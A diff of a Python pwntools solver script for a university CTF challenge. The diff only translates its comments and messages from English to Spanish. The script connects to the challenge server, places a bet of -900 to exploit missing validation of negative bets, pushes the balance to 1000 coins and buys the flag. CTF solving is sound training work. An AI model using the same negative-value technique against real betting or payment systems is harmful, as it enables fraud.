@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Blackjack CTF Challenge Solver - FINAL
+Solver Blackjack CTF - FINAL
 Objetivo: Obtener 1000 monedas para comprar la flag
 
 VULNERABILIDAD ENCONTRADA:
@@ -17,38 +17,38 @@ HOST = "lottery.ctf.cert.unlp.edu.ar"
 PORT = 35001
 
 def exploit():
-    """Exploit con negative bet"""
+    """Exploit con apuesta negativa"""
     con = remote(HOST, PORT, timeout=10)
     
     try:
         banner = con.recvuntil(b">", timeout=5)
-        print("[+] Connected to server")
-        print("[*] Exploit: Negative bet vulnerability")
-        print("[*] If we bet -900, coins = 100 - (-900) = 1000\n")
+        print("[+] Conectado al servidor")
+        print("[*] Exploit: Vulnerabilidad de apuesta negativa")
+        print("[*] Si apostamos -900, monedas = 100 - (-900) = 1000\n")
         
-        # Play a round
+        # Jugar una ronda
         con.sendline(b"1")
         time.sleep(0.2)
         con.recv(512, timeout=2)
         
-        # Send negative bet (-900)
+        # Enviar apuesta negativa (-900)
         con.sendline(b"-900")
         time.sleep(0.2)
         con.recv(256, timeout=2)
         
-        # Guess any number (doesn't matter)
+        # Adivinar cualquier número (no importa)
         con.sendline(b"0")
         time.sleep(0.2)
         resp = con.recv(512, timeout=2).decode(errors="replace")
-        print("[*] Round result:")
+        print("[*] Resultado de la ronda:")
         print(resp)
         
-        # Buy flag
+        # Comprar flag
         con.sendline(b"2")
         time.sleep(0.2)
         result = con.recvall(timeout=3)
         
-        print("\n[+] FLAG ACQUIRED:")
+        print("\n[+] FLAG OBTENIDA:")
         print(result.decode(errors="replace"))
         
         con.close()
@@ -61,5 +61,5 @@ def exploit():
             pass
 
 if __name__ == "__main__":
-    print("[*] Blackjack CTF Solver - Negative Bet Exploit\n")
+    print("[*] Solver Blackjack CTF - Exploit de Apuesta Negativa\n")
     exploit()
